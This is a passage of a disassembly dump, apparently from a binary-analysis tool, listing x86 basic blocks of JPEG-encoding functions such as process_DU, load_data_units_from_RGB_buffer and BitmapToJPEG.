0x804d3cd:	fmul	dword ptr [0x8056064]
0x804d3d3:	fadd	st(2)
0x804d3d5:	fxch	st(1)
0x804d3d7:	fmul	dword ptr [0x8056068]
0x804d3dd:	faddp	st(2)
0x804d3df:	fld	dword ptr [esp + 4]
0x804d3e3:	fadd	dword ptr [esp]
0x804d3e6:	fmul	dword ptr [0x805605c]
0x804d3ec:	fld	st(3)
0x804d3ee:	fadd	st(1)
0x804d3f0:	fxch	st(4)
0x804d3f2:	fsubrp	st(1)
0x804d3f4:	fld	st(0)
0x804d3f6:	fadd	st(2)
0x804d3f8:	fstp	dword ptr [eax + 0xa0]
0x804d3fe:	fsubrp	st(1)
0x804d400:	fstp	dword ptr [eax + 0x60]
0x804d403:	fld	st(1)
0x804d405:	fadd	st(1)
0x804d407:	fstp	dword ptr [eax + 0x20]
0x804d40a:	fsubp	st(1)
0x804d40c:	fstp	dword ptr [eax + 0xe0]
0x804d412:	add	eax, 4
0x804d415:	cmp	eax, edx
0x804d417:	jne	0x804d338
None
|
|
|
v
0x804d463:	fstp	st(0)
0x804d465:	add	esp, 0x114
0x804d46b:	pop	ebx
0x804d46c:	pop	esi
0x804d46d:	ret	
None
|
|
|
v
0x804d258:	lea	edx, dword ptr [esp + 0x110]
0x804d25f:	lea	eax, dword ptr [esp + 0x10]
0x804d263:	fld	dword ptr [eax]
0x804d265:	fld	dword ptr [eax + 0x1c]
0x804d268:	fld	st(1)
0x804d26a:	fadd	st(1)
0x804d26c:	fxch	st(1)
0x804d26e:	fsubp	st(2)
0x804d270:	fld	dword ptr [eax + 4]
0x804d273:	fld	dword ptr [eax + 0x18]
0x804d276:	fld	st(1)
0x804d278:	fadd	st(1)
0x804d27a:	fxch	st(2)
0x804d27c:	fsubrp	st(1)
0x804d27e:	fstp	dword ptr [esp]
0x804d281:	fld	dword ptr [eax + 8]
0x804d284:	fld	dword ptr [eax + 0x14]
0x804d287:	fld	st(1)
0x804d289:	fadd	st(1)
0x804d28b:	fxch	st(2)
0x804d28d:	fsubrp	st(1)
0x804d28f:	fstp	dword ptr [esp + 4]
0x804d293:	fld	dword ptr [eax + 0x10]
0x804d296:	fld	dword ptr [eax + 0xc]
0x804d299:	fadd	st(1)
0x804d29b:	fld	st(4)
0x804d29d:	fadd	st(1)
0x804d29f:	fxch	st(1)
0x804d2a1:	fsubp	st(5)
0x804d2a3:	fld	st(3)
0x804d2a5:	fadd	st(3)
0x804d2a7:	fld	st(1)
0x804d2a9:	fadd	st(1)
0x804d2ab:	fstp	dword ptr [eax]
0x804d2ad:	fsubp	st(1)
0x804d2af:	fstp	dword ptr [eax + 0x10]
0x804d2b2:	fxch	st(1)
0x804d2b4:	fsubp	st(2)
0x804d2b6:	fxch	st(1)
0x804d2b8:	fadd	st(2)
0x804d2ba:	fmul	dword ptr [0x805605c]
0x804d2c0:	fld	st(2)
0x804d2c2:	fadd	st(1)
0x804d2c4:	fstp	dword ptr [eax + 8]
0x804d2c7:	fsubp	st(2)
0x804d2c9:	fxch	st(1)
0x804d2cb:	fstp	dword ptr [eax + 0x18]
0x804d2ce:	fsubr	dword ptr [eax + 0xc]
0x804d2d1:	fadd	dword ptr [esp + 4]
0x804d2d5:	fld	dword ptr [esp]
0x804d2d8:	fadd	st(2)
0x804d2da:	fld	st(1)
0x804d2dc:	fsub	st(1)
0x804d2de:	fmul	dword ptr [0x8056060]
0x804d2e4:	fxch	st(2)
0x804d2e6:	fmul	dword ptr [0x8056064]
0x804d2ec:	fadd	st(2)
0x804d2ee:	fxch	st(1)
0x804d2f0:	fmul	dword ptr [0x8056068]
0x804d2f6:	faddp	st(2)
0x804d2f8:	fld	dword ptr [esp + 4]
0x804d2fc:	fadd	dword ptr [esp]
0x804d2ff:	fmul	dword ptr [0x805605c]
0x804d305:	fld	st(3)
0x804d307:	fadd	st(1)
0x804d309:	fxch	st(4)
0x804d30b:	fsubrp	st(1)
0x804d30d:	fld	st(0)
0x804d30f:	fadd	st(2)
0x804d311:	fstp	dword ptr [eax + 0x14]
0x804d314:	fsubrp	st(1)
0x804d316:	fstp	dword ptr [eax + 0xc]
0x804d319:	fld	st(1)
0x804d31b:	fadd	st(1)
0x804d31d:	fstp	dword ptr [eax + 4]
0x804d320:	fsubp	st(1)
0x804d322:	fstp	dword ptr [eax + 0x1c]
0x804d325:	add	eax, 0x20
0x804d328:	cmp	eax, edx
0x804d32a:	jne	0x804d263
None
|
|
|
v
0x804d330:	lea	edx, dword ptr [esp + 0x30]
0x804d334:	lea	eax, dword ptr [esp + 0x10]
0x804d338:	fld	dword ptr [eax]
0x804d33a:	fld	dword ptr [eax + 0xe0]
0x804d340:	fld	st(1)
0x804d342:	fadd	st(1)
0x804d344:	fxch	st(1)
0x804d346:	fsubp	st(2)
0x804d348:	fld	dword ptr [eax + 0x20]
0x804d34b:	fld	dword ptr [eax + 0xc0]
0x804d351:	fld	st(1)
0x804d353:	fadd	st(1)
0x804d355:	fxch	st(2)
0x804d357:	fsubrp	st(1)
0x804d359:	fstp	dword ptr [esp]
0x804d35c:	fld	dword ptr [eax + 0x40]
0x804d35f:	fld	dword ptr [eax + 0xa0]
0x804d365:	fld	st(1)
0x804d367:	fadd	st(1)
0x804d369:	fxch	st(2)
0x804d36b:	fsubrp	st(1)
0x804d36d:	fstp	dword ptr [esp + 4]
0x804d371:	fld	dword ptr [eax + 0x80]
0x804d377:	fld	dword ptr [eax + 0x60]
0x804d37a:	fadd	st(1)
0x804d37c:	fld	st(4)
0x804d37e:	fadd	st(1)
0x804d380:	fxch	st(1)
0x804d382:	fsubp	st(5)
0x804d384:	fld	st(3)
0x804d386:	fadd	st(3)
0x804d388:	fld	st(1)
0x804d38a:	fadd	st(1)
0x804d38c:	fstp	dword ptr [eax]
0x804d38e:	fsubp	st(1)
0x804d390:	fstp	dword ptr [eax + 0x80]
0x804d396:	fxch	st(1)
0x804d398:	fsubp	st(2)
0x804d39a:	fxch	st(1)
0x804d39c:	fadd	st(2)
0x804d39e:	fmul	dword ptr [0x805605c]
0x804d3a4:	fld	st(2)
0x804d3a6:	fadd	st(1)
0x804d3a8:	fstp	dword ptr [eax + 0x40]
0x804d3ab:	fsubp	st(2)
0x804d3ad:	fxch	st(1)
0x804d3af:	fstp	dword ptr [eax + 0xc0]
0x804d3b5:	fsubr	dword ptr [eax + 0x60]
0x804d3b8:	fadd	dword ptr [esp + 4]
0x804d3bc:	fld	dword ptr [esp]
0x804d3bf:	fadd	st(2)
0x804d3c1:	fld	st(1)
0x804d3c3:	fsub	st(1)
0x804d3c5:	fmul	dword ptr [0x8056060]
0x804d3cb:	fxch	st(2)
0x804d3cd:	fmul	dword ptr [0x8056064]
0x804d3d3:	fadd	st(2)
0x804d3d5:	fxch	st(1)
0x804d3d7:	fmul	dword ptr [0x8056068]
0x804d3dd:	faddp	st(2)
0x804d3df:	fld	dword ptr [esp + 4]
0x804d3e3:	fadd	dword ptr [esp]
0x804d3e6:	fmul	dword ptr [0x805605c]
0x804d3ec:	fld	st(3)
0x804d3ee:	fadd	st(1)
0x804d3f0:	fxch	st(4)
0x804d3f2:	fsubrp	st(1)
0x804d3f4:	fld	st(0)
0x804d3f6:	fadd	st(2)
0x804d3f8:	fstp	dword ptr [eax + 0xa0]
0x804d3fe:	fsubrp	st(1)
0x804d400:	fstp	dword ptr [eax + 0x60]
0x804d403:	fld	st(1)
0x804d405:	fadd	st(1)
0x804d407:	fstp	dword ptr [eax + 0x20]
0x804d40a:	fsubp	st(1)
0x804d40c:	fstp	dword ptr [eax + 0xe0]
0x804d412:	add	eax, 4
0x804d415:	cmp	eax, edx
0x804d417:	jne	0x804d338
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:process_DU
TOTAL BLOCKS :29
0x804d4a4:	movzx	edx, byte ptr [eax + 0x8055ff8]
0x804d4ab:	mov	cx, word ptr [eax + eax + 0x805b7e0]
0x804d4b3:	inc	eax
0x804d4b4:	cmp	eax, 0x40
0x804d4b7:	mov	word ptr [edx + edx + 0x805b860], cx
0x804d4bf:	jne	0x804d4a4
None
|
|
|
v
0x804d577:	movsx	esi, word ptr [esp + 2]
0x804d57c:	movzx	eax, al
0x804d57f:	push	edx
0x804d580:	mov	edx, dword ptr [0x805b8e0]
0x804d586:	shl	eax, 4
0x804d589:	movzx	edx, byte ptr [edx + esi]
0x804d58d:	add	eax, edx
0x804d58f:	push	dword ptr [edi + eax*4]
0x804d592:	mov	byte ptr [esp + 0x10], cl
0x804d596:	call	0x804cfc2
None
|
|
|
v
0x804d46e:	push	ebp
0x804d46f:	push	edi
0x804d470:	push	esi
0x804d471:	push	ebx
0x804d472:	sub	esp, 0x20
0x804d475:	mov	edi, dword ptr [esp + 0x44]
0x804d479:	mov	esi, dword ptr [esp + 0x3c]
0x804d47d:	mov	ebx, dword ptr [esp + 0x40]
0x804d481:	mov	eax, dword ptr [edi + 0x3c0]
0x804d487:	mov	ebp, dword ptr [edi]
0x804d489:	mov	dword ptr [esp + 0x18], eax
0x804d48d:	push	0x805b7e0
0x804d492:	push	dword ptr [esp + 0x3c]
0x804d496:	push	dword ptr [esp + 0x3c]
0x804d49a:	call	0x804d221
None
|
|
|
v
0x804d49f:	add	esp, 0x10
0x804d4a2:	xor	eax, eax
0x804d4a4:	movzx	edx, byte ptr [eax + 0x8055ff8]
0x804d4ab:	mov	cx, word ptr [eax + eax + 0x805b7e0]
0x804d4b3:	inc	eax
0x804d4b4:	cmp	eax, 0x40
0x804d4b7:	mov	word ptr [edx + edx + 0x805b860], cx
0x804d4bf:	jne	0x804d4a4
None
|
|
|
v
0x804d5a9:	lea	eax, dword ptr [ebx + 1]
0x804d5ac:	pop	ebx
0x804d5ad:	pop	esi
0x804d5ae:	mov	cl, byte ptr [esp + 8]
0x804d5b2:	cmp	al, cl
0x804d5b4:	ja	0x804d5bd
None
|
|
|
v
0x804d533:	mov	word ptr [esp + 2], dx
0x804d538:	mov	dl, bl
0x804d53a:	sub	dl, al
0x804d53c:	cmp	dl, 0xf
0x804d53f:	mov	al, dl
0x804d541:	jbe	0x804d577
None
|
|
|
v
0x804d519:	jmp	0x804d5cd
None
|
|
|
v
0x804d5cd:	mov	al, 1
0x804d5cf:	mov	cl, bl
0x804d5d1:	jmp	0x804d5b6
None
|
|
|
v
0x804d4c1:	mov	edx, dword ptr [0x805b860]
0x804d4c7:	mov	eax, edx
0x804d4c9:	sub	ax, word ptr [esi]
0x804d4cc:	mov	word ptr [esi], dx
0x804d4cf:	test	ax, ax
0x804d4d2:	jne	0x804d4d9
None
|
|
|
v
0x804d4ee:	mov	eax, dword ptr [0x805b8e4]
0x804d4f3:	pop	ebx
0x804d4f4:	push	dword ptr [eax + esi*4]
0x804d4f7:	call	0x804cfc2
None
|
|
|
v
0x804d4d4:	push	esi
0x804d4d5:	push	dword ptr [ebx]
0x804d4d7:	jmp	0x804d4f7
None
|
|
|
v
0x804d4d9:	movsx	esi, ax
0x804d4dc:	mov	eax, dword ptr [0x805b8e0]
0x804d4e1:	push	ecx
0x804d4e2:	movzx	eax, byte ptr [eax + esi]
0x804d4e6:	push	dword ptr [ebx + eax*4]
0x804d4e9:	call	0x804cfc2
None
|
|
|
v
0x804d5bd:	cmp	cl, 0x3f
0x804d5c0:	je	0x804d5d3
None
|
|
|
v
0x804d5c2:	push	esi
0x804d5c3:	push	ebp
0x804d5c4:	call	0x804cfc2
None
|
|
|
v
0x804d59b:	mov	eax, dword ptr [0x805b8e4]
0x804d5a0:	pop	ecx
0x804d5a1:	push	dword ptr [eax + esi*4]
0x804d5a4:	call	0x804cfc2
None
|
|
|
v
0x804d5d3:	add	esp, 0x1c
0x804d5d6:	pop	ebx
0x804d5d7:	pop	esi
0x804d5d8:	pop	edi
0x804d5d9:	pop	ebp
0x804d5da:	ret	
None
|
|
|
v
0x804d4f7:	call	0x804cfc2
None
|
|
|
v
0x804d50f:	cmp	word ptr [eax + 0x805b8de], 0
0x804d517:	je	0x804d504
None
|
|
|
v
0x804d574:	and	eax, 0xf
0x804d577:	movsx	esi, word ptr [esp + 2]
0x804d57c:	movzx	eax, al
0x804d57f:	push	edx
0x804d580:	mov	edx, dword ptr [0x805b8e0]
0x804d586:	shl	eax, 4
0x804d589:	movzx	edx, byte ptr [edx + esi]
0x804d58d:	add	eax, edx
0x804d58f:	push	dword ptr [edi + eax*4]
0x804d592:	mov	byte ptr [esp + 0x10], cl
0x804d596:	call	0x804cfc2
None
|
|
|
v
0x804d5b6:	mov	bl, al
0x804d5b8:	jmp	0x804d51f
None
|
|
|
v
0x804d5c9:	pop	edi
0x804d5ca:	pop	ebp
0x804d5cb:	jmp	0x804d5d3
None
|
|
|
v
0x804d52f:	cmp	bl, cl
0x804d531:	jbe	0x804d51e
None
|
|
|
v
0x804d54f:	push	edx
0x804d550:	inc	esi
0x804d551:	push	dword ptr [esp + 0x18]
0x804d555:	mov	byte ptr [esp + 0x14], al
0x804d559:	mov	byte ptr [esp + 0x10], cl
0x804d55d:	call	0x804cfc2
None
|
|
|
v
0x804d504:	sub	eax, 2
0x804d507:	dec	bl
0x804d509:	je	0x804d5c2
None
|
|
|
v
0x804d562:	mov	edx, esi
0x804d564:	pop	ecx
0x804d565:	pop	eax
0x804d566:	cmp	dl, byte ptr [esp + 0x13]
0x804d56a:	mov	al, byte ptr [esp + 0xc]
0x804d56e:	mov	cl, byte ptr [esp + 8]
0x804d572:	jbe	0x804d54f
None
|
|
|
v
0x804d51f:	movzx	edx, bl
0x804d522:	mov	dx, word ptr [edx + edx + 0x805b860]
0x804d52a:	test	dx, dx
0x804d52d:	jne	0x804d533
None
|
|
|
v
0x804d4fc:	mov	bl, 0x3f
0x804d4fe:	pop	eax
0x804d4ff:	xor	eax, eax
0x804d501:	pop	edx
0x804d502:	jmp	0x804d50f
None
|
|
|
v
0x804d543:	shr	dl, 4
0x804d546:	mov	esi, 1
0x804d54b:	mov	byte ptr [esp + 0x13], dl
0x804d54f:	push	edx
0x804d550:	inc	esi
0x804d551:	push	dword ptr [esp + 0x18]
0x804d555:	mov	byte ptr [esp + 0x14], al
0x804d559:	mov	byte ptr [esp + 0x10], cl
0x804d55d:	call	0x804cfc2
None
|
|
|
v
0x804d51e:	inc	ebx
0x804d51f:	movzx	edx, bl
0x804d522:	mov	dx, word ptr [edx + edx + 0x805b860]
0x804d52a:	test	dx, dx
0x804d52d:	jne	0x804d533
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:load_data_units_from_RGB_buffer
TOTAL BLOCKS :5
0x804d68e:	add	byte ptr [esp + 6], 8
0x804d693:	mov	edx, dword ptr [esp + 8]
0x804d697:	add	dword ptr [esp], edx
0x804d69a:	cmp	byte ptr [esp + 6], 0x40
0x804d69f:	je	0x804d6b8
None
|
|
|
v
0x804d5db:	push	ebp
0x804d5dc:	push	edi
0x804d5dd:	push	esi
0x804d5de:	push	ebx
0x804d5df:	sub	esp, 0x10
0x804d5e2:	movzx	edx, word ptr [0x805be8a]
0x804d5e9:	movzx	eax, word ptr [esp + 0x28]
0x804d5ee:	mov	byte ptr [esp + 6], 0
0x804d5f3:	mov	dword ptr [esp + 8], edx
0x804d5f7:	imul	eax, edx
0x804d5fa:	movzx	edx, word ptr [esp + 0x24]
0x804d5ff:	add	edx, eax
0x804d601:	mov	eax, dword ptr [0x805874c]
0x804d606:	mov	dword ptr [esp], edx
0x804d609:	mov	dword ptr [esp + 0xc], eax
0x804d60d:	jmp	0x804d6a1
None
|
|
|
v
0x804d6b8:	add	esp, 0x10
0x804d6bb:	pop	ebx
0x804d6bc:	pop	esi
0x804d6bd:	pop	edi
0x804d6be:	pop	ebp
0x804d6bf:	ret	
None
|
|
|
v
0x804d612:	movzx	ebp, byte ptr [ecx + edx + 2]
0x804d617:	movzx	edi, byte ptr [ecx + edx + 1]
0x804d61c:	movzx	esi, byte ptr [ecx + edx]
0x804d620:	add	edx, 3
0x804d623:	movzx	ebx, byte ptr [esp + 7]
0x804d628:	mov	eax, dword ptr [ebp*4 + 0x80591e0]
0x804d62f:	add	eax, dword ptr [edi*4 + 0x8059de0]
0x804d636:	add	eax, dword ptr [esi*4 + 0x805a9e0]
0x804d63d:	inc	byte ptr [esp + 7]
0x804d641:	sar	eax, 0x10
0x804d644:	add	eax, -0x80
0x804d647:	mov	byte ptr [ebx + 0x805b8e8], al
0x804d64d:	mov	eax, dword ptr [ebp*4 + 0x80595e0]
0x804d654:	add	eax, dword ptr [edi*4 + 0x805a1e0]
0x804d65b:	add	eax, dword ptr [esi*4 + 0x805ade0]
0x804d662:	sar	eax, 0x10
0x804d665:	mov	byte ptr [ebx + 0x805b928], al
0x804d66b:	mov	eax, dword ptr [ebp*4 + 0x80599e0]
0x804d672:	add	eax, dword ptr [edi*4 + 0x805a5e0]
0x804d679:	add	eax, dword ptr [esi*4 + 0x805b1e0]
0x804d680:	sar	eax, 0x10
0x804d683:	cmp	edx, 0x18
0x804d686:	mov	byte ptr [ebx + 0x805b968], al
0x804d68c:	jne	0x804d612
None
|
|
|
v
0x804d6a1:	mov	al, byte ptr [esp + 6]
0x804d6a5:	xor	edx, edx
0x804d6a7:	imul	ecx, dword ptr [esp], 3
0x804d6ab:	add	ecx, dword ptr [esp + 0xc]
0x804d6af:	mov	byte ptr [esp + 7], al
0x804d6b3:	jmp	0x804d612
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:BitmapToJPEG
TOTAL BLOCKS :169
0x804da6c:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804deac:	mov	dword ptr [esp], 2
0x804deb3:	call	0x804ce14
None
|
|
|
v
0x804ddbc:	movzx	eax, byte ptr [ebx + 0x805880a]
0x804ddc3:	sub	esp, 0xc
0x804ddc6:	inc	ebx
0x804ddc7:	push	eax
0x804ddc8:	call	0x804ce14
None
|
|
|
v
0x804dc92:	movzx	eax, byte ptr [0x8058362]
0x804dc99:	mov	dword ptr [esp], eax
0x804dc9c:	call	0x804ce14
None
|
|
|
v
0x804dfbb:	add	ebx, 8
0x804dfbe:	cmp	bx, word ptr [0x805be88]
0x804dfc5:	jb	0x804dfa9
None
|
|
|
v
0x804dd0a:	movzx	eax, byte ptr [0x805836a]
0x804dd11:	mov	dword ptr [esp], eax
0x804dd14:	call	0x804ce14
None
|
|
|
v
0x804def4:	mov	dword ptr [esp], 0
0x804defb:	call	0x804ce14
None
|
|
|
v
0x804dcce:	movzx	eax, byte ptr [0x8058366]
0x804dcd5:	mov	dword ptr [esp], eax
0x804dcd8:	call	0x804ce14
None
|
|
|
v
0x804dc5d:	movzx	eax, word ptr [0x805835a]
0x804dc64:	mov	dword ptr [esp], eax
0x804dc67:	call	0x804ce2d
None
|
|
|
v
0x804d6f1:	call	0x804d09b
None
|
|
|
v
0x804d8e6:	add	esp, 0x10
0x804d8e9:	xor	edx, edx
0x804d8eb:	test	eax, eax
0x804d8ed:	mov	dword ptr [0x805874c], eax
0x804d8f2:	jne	0x804d843
None
|
|
|
v
0x804df33:	push	edx
0x804df34:	push	edx
0x804df35:	movzx	edx, si
0x804df38:	push	eax
0x804df39:	add	esi, 8
0x804df3c:	push	edx
0x804df3d:	mov	dword ptr [esp + 0x18], eax
0x804df41:	call	0x804d5db
None
|
|
|
v
0x804da4f:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804d8bd:	sub	esp, 0xc
0x804d8c0:	push	eax
0x804d8c1:	call	0x804bbc0
None
|
|
|
v
0x804d99e:	cmp	dword ptr [0x805b9c0], 0
0x804d9a5:	jne	0x804d9e1
None
|
|
|
v
0x804db2c:	mov	dword ptr [esp], 5
0x804db33:	call	0x804ce2d
None
|
|
|
v
0x804dc43:	add	esp, 0x10
0x804dc46:	cmp	ebx, 0x40
0x804dc49:	jne	0x804dc32
None
|
|
|
v
0x804dba4:	mov	dword ptr [esp], 1
0x804dbab:	call	0x804ce2d
None
|
|
|
v
0x804d732:	add	eax, 0x7fff
0x804d737:	mov	dword ptr [0x805b8e0], eax
0x804d73c:	cmp	dword ptr [0x805b9ac], 0
0x804d743:	jne	0x804d76e
None
|
|
|
v
0x804dbbc:	mov	dword ptr [esp], 0
0x804dbc3:	call	0x804ce14
None
|
|
|
v
0x804dab6:	movzx	ecx, word ptr [0x805be8a]
0x804dabd:	movzx	eax, dx
0x804dac0:	mov	esi, ebx
0x804dac2:	inc	edx
0x804dac3:	imul	eax, ecx
0x804dac6:	mov	ecx, ebp
0x804dac8:	lea	eax, dword ptr [eax + eax*2]
0x804dacb:	add	eax, dword ptr [0x805874c]
0x804dad1:	mov	edi, eax
0x804dad3:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804d889:	test	byte ptr [esp + 0x12], 7
0x804d88e:	je	0x804d8a8
None
|
|
|
v
0x804d867:	mov	eax, dword ptr [esp + 0x1c]
0x804d86b:	shr	ax, 3
0x804d86f:	lea	eax, dword ptr [eax*8 + 8]
0x804d876:	mov	word ptr [0x805b9b8], ax
0x804d87c:	jmp	0x804d889
None
|
|
|
v
0x804d745:	sub	esp, 0xc
0x804d748:	push	0x3fffc
0x804d74d:	call	0x804bd40
None
|
|
|
v
0x804dec4:	mov	dword ptr [esp], 3
0x804decb:	call	0x804ce14
None
|
|
|
v
0x804d7d8:	mov	ecx, dword ptr [esp + 0xc]
0x804d7dc:	inc	eax
0x804d7dd:	add	esi, esi
0x804d7df:	add	ecx, ecx
0x804d7e1:	cmp	al, 0x10
0x804d7e3:	je	0x804d7e9
None
|
|
|
v
0x804dcb0:	movzx	eax, byte ptr [0x8058364]
0x804dcb7:	mov	dword ptr [esp], eax
0x804dcba:	call	0x804ce14
None
|
|
|
v
0x804d788:	mov	byte ptr [ebp + edx], al
0x804d78c:	mov	byte ptr [edi + edx*4], al
0x804d78f:	mov	word ptr [edi + edx*4 + 2], dx
0x804d794:	inc	edx
0x804d795:	cmp	edx, ecx
0x804d797:	jl	0x804d788
None
|
|
|
v
0x804dedc:	mov	dword ptr [esp], 0
0x804dee3:	call	0x804ce14
None
|
|
|
v
0x804dd28:	movzx	eax, word ptr [0x80587d8]
0x804dd2f:	mov	dword ptr [esp], eax
0x804dd32:	call	0x804ce2d
None
|
|
|
v
0x804dd55:	add	esp, 0x10
0x804dd58:	movzx	eax, byte ptr [ebx + 0x80587dd]
0x804dd5f:	sub	esp, 0xc
0x804dd62:	inc	ebx
0x804dd63:	push	eax
0x804dd64:	call	0x804ce14
None
|
|
|
v
0x804dbf2:	movzx	eax, byte ptr [0x8058754]
0x804dbf9:	mov	dword ptr [esp], eax
0x804dbfc:	call	0x804ce14
None
|
|
|
v
0x804d700:	cmp	dword ptr [0x805b9a8], 0
0x804d707:	mov	dword ptr [0x8058744], 0
0x804d711:	jne	0x804d73c
None
|
|
|
v
0x804d8c6:	add	esp, 0x10
0x804d8c9:	movzx	eax, word ptr [0x805b9b8]
0x804d8d0:	sub	esp, 0xc
0x804d8d3:	movzx	edx, word ptr [0x805b9ba]
0x804d8da:	lea	eax, dword ptr [eax + eax*2]
0x804d8dd:	imul	eax, edx
0x804d8e0:	push	eax
0x804d8e1:	call	0x804bd40
None
|
|
|
v
0x804dc32:	movzx	eax, byte ptr [ebx + 0x8058796]
0x804dc39:	sub	esp, 0xc
0x804dc3c:	inc	ebx
0x804dc3d:	push	eax
0x804dc3e:	call	0x804ce14
None
|
|
|
v
0x804d6ec:	call	0x804ceef
None
|
|
|
v
0x804dfc7:	mov	cl, byte ptr [0x8058356]
0x804dfcd:	test	cl, cl
0x804dfcf:	js	0x804dff4
None
|
|
|
v
0x804d87e:	mov	edx, dword ptr [esp + 0x1c]
0x804d882:	mov	word ptr [0x805b9b8], dx
0x804d889:	test	byte ptr [esp + 0x12], 7
0x804d88e:	je	0x804d8a8
None
|
|
|
v
0x804dd46:	movzx	eax, byte ptr [0x80587dc]
0x804dd4d:	mov	dword ptr [esp], eax
0x804dd50:	call	0x804ce14
None
|
|
|
v
0x804de36:	movzx	eax, byte ptr [ebx + 0x80588ca]
0x804de3d:	sub	esp, 0xc
0x804de40:	inc	ebx
0x804de41:	push	eax
0x804de42:	call	0x804ce14
None
|
|
|
v
0x804ddcd:	add	esp, 0x10
0x804ddd0:	cmp	ebx, 0xa2
0x804ddd6:	jne	0x804ddbc
None
|
|
|
v
0x804dfd1:	lea	edx, dword ptr [ecx + 1]
0x804dfd4:	movsx	ecx, cl
0x804dfd7:	inc	ecx
0x804dfd8:	mov	eax, 1
0x804dfdd:	shl	eax, cl
0x804dfdf:	movzx	edx, dl
0x804dfe2:	dec	eax
0x804dfe3:	sub	esp, 0xc
0x804dfe6:	shl	eax, 0x10
0x804dfe9:	or	edx, eax
0x804dfeb:	push	edx
0x804dfec:	call	0x804cfc2
None
|
|
|
v
0x804db8c:	mov	dword ptr [esp], 1
0x804db93:	call	0x804ce14
None
|
|
|
v
0x804de62:	add	esp, 0x10
0x804de65:	cmp	ebx, 0xa2
0x804de6b:	jne	0x804de51
None
|
|
|
v
0x804de21:	movzx	eax, byte ptr [0x80588c9]
0x804de28:	sub	esp, 0xc
0x804de2b:	xor	bl, bl
0x804de2d:	push	eax
0x804de2e:	call	0x804ce14
None
|
|
|
v
0x804dfa0:	add	esp, 0x20
0x804dfa3:	mov	eax, dword ptr [esp + 8]
0x804dfa7:	jmp	0x804dfae
None
|
|
|
v
0x804dad3:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804dad5:	mov	ax, word ptr [0x805b9ba]
0x804dadb:	cmp	dx, ax
0x804dade:	jb	0x804dab6
None
|
|
|
v
0x804daf4:	add	esp, 0x10
0x804daf7:	xor	edx, edx
0x804daf9:	test	eax, eax
0x804dafb:	mov	dword ptr [0x8058748], eax
0x804db00:	je	0x804e015
None
|
|
|
v
0x804ddba:	xor	bl, bl
0x804ddbc:	movzx	eax, byte ptr [ebx + 0x805880a]
0x804ddc3:	sub	esp, 0xc
0x804ddc6:	inc	ebx
0x804ddc7:	push	eax
0x804ddc8:	call	0x804ce14
None
|
|
|
v
0x804df7f:	add	esp, 0x14
0x804df82:	push	0x8058de0
0x804df87:	push	0x80589b0
0x804df8c:	lea	edx, dword ptr [esp + 0x42]
0x804df90:	push	edx
0x804df91:	push	0x805b6e0
0x804df96:	push	0x805b968
0x804df9b:	call	0x804d46e
None
|
|
|
v
0x804d7e5:	mov	edx, esi
0x804d7e7:	jmp	0x804d795
None
|
|
|
v
0x804de94:	mov	dword ptr [esp], 1
0x804de9b:	call	0x804ce14
None
|
|
|
v
0x804de6d:	sub	esp, 0xc
0x804de70:	xor	bl, bl
0x804de72:	push	0xffda
0x804de77:	call	0x804ce2d
None
|
|
|
v
0x804dc88:	pop	ecx
0x804dc89:	push	dword ptr [esp + 0x20]
0x804dc8d:	call	0x804ce2d
None
|
|
|
v
0x804dc15:	add	esp, 0x10
0x804dc18:	cmp	ebx, 0x40
0x804dc1b:	jne	0x804dc04
None
|
|
|
v
0x804d6e2:	mov	byte ptr [0x8058740], al
0x804d6e7:	call	0x804ce9d
None
|
|
|
v
0x804d7f4:	cmp	byte ptr [ebx + 1], 0x4d
0x804d7f8:	jne	0x804e015
None
|
|
|
v
0x804d808:	mov	eax, dword ptr [esp + 0x58]
0x804d80c:	mov	ecx, dword ptr [esp + 0x5c]
0x804d810:	mov	edx, eax
0x804d812:	movzx	edx, dx
0x804d815:	cmp	dword ptr [0x805b9b0], edx
0x804d81b:	mov	word ptr [esp + 0x1c], ax
0x804d820:	mov	word ptr [0x805be8a], ax
0x804d826:	movzx	eax, cx
0x804d829:	mov	word ptr [esp + 0x12], cx
0x804d82e:	mov	word ptr [0x805be88], cx
0x804d835:	mov	dword ptr [esp + 0x14], edx
0x804d839:	jne	0x804d851
None
|
|
|
v
0x804d752:	add	esp, 0x10
0x804d755:	xor	edx, edx
0x804d757:	test	eax, eax
0x804d759:	mov	dword ptr [0x805b9ac], eax
0x804d75e:	je	0x804e015
None
|
|
|
v
0x804dfa9:	xor	esi, esi
0x804dfab:	movzx	eax, bx
0x804dfae:	cmp	si, word ptr [0x805be8a]
0x804dfb5:	jb	0x804df33
None
|
|
|
v
0x804de47:	add	esp, 0x10
0x804de4a:	cmp	ebx, 0x10
0x804de4d:	jne	0x804de36
None
|
|
|
v
0x804dcec:	movzx	eax, byte ptr [0x8058368]
0x804dcf3:	mov	dword ptr [esp], eax
0x804dcf6:	call	0x804ce14
None
|
|
|
v
0x804db68:	mov	dword ptr [esp], 0x46
0x804db6f:	call	0x804ce14
None
|
|
|
v
0x804da51:	mov	ecx, ebx
0x804da53:	movzx	eax, word ptr [0x805be8a]
0x804da5a:	mov	esi, dword ptr [esp + 0xc]
0x804da5e:	imul	eax, edx
0x804da61:	lea	eax, dword ptr [eax + eax*2]
0x804da64:	add	eax, dword ptr [0x805874c]
0x804da6a:	mov	edi, eax
0x804da6c:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804df00:	mov	word ptr [esp + 0x3a], 0
0x804df07:	mov	word ptr [esp + 0x3c], 0
0x804df0e:	mov	word ptr [esp + 0x3e], 0
0x804df15:	add	esp, 0x10
0x804df18:	mov	byte ptr [0x805897c], 0
0x804df1f:	lea	ebp, dword ptr [esp + 0x2a]
0x804df23:	mov	byte ptr [0x8058356], 7
0x804df2a:	lea	edi, dword ptr [esp + 0x2c]
0x804df2e:	jmp	0x804dfbe
None
|
|
|
v
0x804d6f6:	call	0x804d0f2
None
|
|
|
v
0x804d8c9:	movzx	eax, word ptr [0x805b9b8]
0x804d8d0:	sub	esp, 0xc
0x804d8d3:	movzx	edx, word ptr [0x805b9ba]
